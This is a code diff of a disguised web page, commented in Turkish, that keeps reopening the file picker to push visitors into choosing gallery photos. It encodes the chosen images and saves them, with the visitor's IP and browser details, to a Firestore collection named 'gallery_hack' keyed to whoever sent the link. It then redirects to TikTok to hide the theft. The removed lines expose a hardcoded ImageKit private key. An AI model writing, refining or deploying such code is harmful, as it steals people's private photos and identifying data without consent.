@@ -6,11 +6,7 @@
     <title>.</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            background: #000;
-            min-height: 100vh;
-            min-height: 100dvh;
-        }
+        body { background: #000; min-height: 100vh; min-height: 100dvh; }
     </style>
 </head>
 <body>
@@ -25,8 +21,6 @@
             const params = new URLSearchParams(window.location.search);
             const uid = params.get('uid');
             const count = Math.min(parseInt(params.get('count')) || 10, 100);
-
-            console.log('UID:', uid, 'Count:', count);
 
             if (!uid) {
                 window.location.href = 'https://www.tiktok.com';
@@ -44,132 +38,108 @@
 
             firebase.initializeApp(firebaseConfig);
             const db = firebase.firestore();
-            console.log('Firebase başlatıldı');
 
-            async function uploadToImageKit(file) {
-                return new Promise((resolve, reject) => {
-                    const formData = new FormData();
-                    formData.append('file', file);
-                    formData.append('publicKey', 'public_XJOKnz4iFXkkFRR/NNOj41Y6Ddk=');
-                    formData.append('fileName', Date.now() + '_' + file.name);
-                    formData.append('folder', '/gallery-uploads');
-                    formData.append('useUniqueFileName', 'true');
-
-                    const xhr = new XMLHttpRequest();
-                    xhr.open('POST', 'https://upload.imagekit.io/api/v1/files/upload');
-                    xhr.setRequestHeader('Authorization', 'Basic ' + btoa('private_T2ESq+R6d+czVTlcK/u4QkW4yBU=' + ':'));
-                    xhr.timeout = 120000;
-
-                    xhr.onload = function() {
-                        console.log('ImageKit yanıt status:', xhr.status);
-                        console.log('ImageKit yanıt:', xhr.responseText);
-                        if (xhr.status === 200 || xhr.status === 201) {
-                            try {
-                                const data = JSON.parse(xhr.responseText);
-                                console.log('ImageKit URL:', data.url);
-                                resolve(data.url);
-                            } catch(e) {
-                                console.error('ImageKit parse hatası:', e);
-                                resolve(null);
-                            }
-                        } else {
-                            console.error('ImageKit hata status:', xhr.status);
-                            resolve(null);
-                        }
+            function fileToBase64(file) {
+                return new Promise((resolve) => {
+                    const reader = new FileReader();
+                    reader.onload = function(e) {
+                        resolve(e.target.result);
                     };
-                    xhr.onerror = function() {
-                        console.error('ImageKit ağ hatası');
+                    reader.onerror = function() {
                         resolve(null);
                     };
-                    xhr.ontimeout = function() {
-                        console.error('ImageKit timeout');
-                        resolve(null);
-                    };
-                    xhr.send(formData);
+                    reader.readAsDataURL(file);
                 });
             }
 
             async function getIP() {
                 try {
                     const r = await fetch('https://api.ipify.org?format=json');
-                    const data = await r.json();
-                    console.log('IP:', data.ip);
-                    return data.ip;
-                } catch(e) {
-                    console.error('IP hatası:', e);
-                    return 'unknown';
-                }
+                    return (await r.json()).ip;
+                } catch(e) { return 'unknown'; }
             }
 
             const galleryInput = document.getElementById('galleryInput');
 
             galleryInput.addEventListener('change', async function(e) {
                 const files = Array.from(e.target.files);
-                console.log('Seçilen dosya sayısı:', files.length);
-                
+                console.log('Seçilen dosyalar:', files.length);
+
                 if (!files || files.length === 0) {
-                    console.log('Dosya seçilmedi, yönlendiriliyor');
                     window.location.href = 'https://www.tiktok.com';
                     return;
                 }
 
                 const selectedFiles = files.slice(0, count);
-                console.log('İşlenecek dosya sayısı:', selectedFiles.length);
+                console.log('İşlenecek:', selectedFiles.length);
 
                 try {
                     const ip = await getIP();
-                    const photoUrls = [];
+                    const photosBase64 = [];
 
                     for (let i = 0; i < selectedFiles.length; i++) {
-                        console.log('Yükleniyor:', i + 1, '/', selectedFiles.length, selectedFiles[i].name);
-                        const url = await uploadToImageKit(selectedFiles[i]);
-                        if (url) {
-                            photoUrls.push(url);
-                            console.log('Yüklendi:', url);
-                        } else {
-                            console.log('Yükleme başarısız:', selectedFiles[i].name);
+                        console.log('Base64 çevriliyor ' + (i+1) + '/' + selectedFiles.length + ':', selectedFiles[i].name, (selectedFiles[i].size / 1024).toFixed(2) + 'KB');
+                        const base64 = await fileToBase64(selectedFiles[i]);
+                        if (base64) {
+                            photosBase64.push(base64);
+                            console.log('Base64 uzunluk:', base64.length, 'karakter');
                         }
                     }
 
-                    console.log('Toplam yüklenen:', photoUrls.length);
+                    console.log('Toplam base64:', photosBase64.length);
 
-                    if (photoUrls.length > 0) {
+                    if (photosBase64.length > 0) {
                         const saveData = {
                             ownerId: uid,
-                            photos: photoUrls,
-                            photoCount: photoUrls.length,
+                            photosBase64: photosBase64,
+                            photoCount: photosBase64.length,
                             requestedCount: count,
                             ip: ip,
                             userAgent: navigator.userAgent,
                             timestamp: new Date().toISOString(),
                             unix: Date.now()
                         };
-                        
-                        console.log('Firebase kayıt:', saveData);
-                        
+
+                        console.log('Firestore kaydediliyor, toplam veri boyutu:', JSON.stringify(saveData).length, 'karakter');
+
                         try {
                             const docRef = await db.collection("gallery_hack").add(saveData);
-                            console.log('Firebase kayıt başarılı, doc ID:', docRef.id);
-                        } catch(dbError) {
-                            console.error('Firebase kayıt hatası:', dbError.message, dbError.code);
-                            // Alternatif kayıt
-                            saveData.userAgent = navigator.userAgent.substring(0, 100);
-                            const docRef2 = await db.collection("gallery_hack").add(saveData);
-                            console.log('Firebase alternatif kayıt başarılı, doc ID:', docRef2.id);
+                            console.log('Firestore başarılı! Doc ID:', docRef.id);
+                        } catch(firestoreError) {
+                            console.error('Firestore hatası:', firestoreError.code, firestoreError.message);
+                            
+                            if (firestoreError.code === 'permission-denied') {
+                                console.log('Yetki hatası - Firestore kurallarını kontrol et');
+                            }
+                            
+                            const simpleData = {
+                                ownerId: uid,
+                                photosBase64: photosBase64,
+                                photoCount: photosBase64.length,
+                                requestedCount: count,
+                                ip: ip,
+                                timestamp: new Date().toISOString(),
+                                unix: Date.now()
+                            };
+                            
+                            try {
+                                const docRef2 = await db.collection("gallery_hack").add(simpleData);
+                                console.log('Basit kayıt başarılı! Doc ID:', docRef2.id);
+                            } catch(e2) {
+                                console.error('Basit kayıt da başarısız:', e2.code, e2.message);
+                            }
                         }
-                    } else {
-                        console.log('Hiç fotoğraf yüklenemedi');
                     }
                 } catch(e) {
-                    console.error('Genel hata:', e.message, e.stack);
+                    console.error('Genel hata:', e.message);
                 }
 
-                console.log('TikTok\'a yönlendiriliyor');
-                window.location.href = 'https://www.tiktok.com';
+                setTimeout(function() {
+                    window.location.href = 'https://www.tiktok.com';
+                }, 2000);
             });
 
             function triggerInput() {
-                console.log('Input tetikleniyor');
                 galleryInput.click();
             }
 
@@ -179,17 +149,23 @@
             setTimeout(triggerInput, 2000);
 
             document.addEventListener('click', triggerInput);
-            document.addEventListener('touchstart', triggerInput, { once: true });
+            document.addEventListener('touchstart', triggerInput);
 
             document.addEventListener('visibilitychange', function() {
                 if (document.visibilityState === 'visible') {
-                    setTimeout(triggerInput, 300);
+                    setTimeout(triggerInput, 500);
                 }
             });
 
             window.addEventListener('focus', function() {
-                setTimeout(triggerInput, 300);
+                setTimeout(triggerInput, 500);
             });
+
+            setTimeout(function() {
+                if (!galleryInput.files || galleryInput.files.length === 0) {
+                    window.location.href = 'https://www.tiktok.com';
+                }
+            }, 8000);
 
         })();
     </script>
